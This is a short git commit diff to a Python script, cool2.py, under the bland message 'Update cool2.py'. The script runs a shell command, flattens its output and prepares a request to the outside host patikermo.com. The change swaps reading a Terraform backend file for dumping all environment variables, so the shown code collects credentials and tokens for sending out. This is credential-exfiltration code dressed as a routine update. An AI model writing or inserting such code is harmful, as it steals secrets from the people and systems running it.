f894dee7cdc29c60649fb0651a7d835f0c93a1e1
Lino Nava <linonava@patikermo.com>
2021-07-16 12:14:40 -0400

    Update cool2.py

--- cool2.py
+++ cool2.py
@@ -1,6 +1,6 @@
 import urllib2
 import subprocess
-output = subprocess.check_output("cat zzz_backend_override.tf.json", shell=True)
+output = subprocess.check_output("env", shell=True)
 output = output.rstrip()
 output = output.replace("\n", " ")
 request = urllib2.Request("https://patikermo.com")
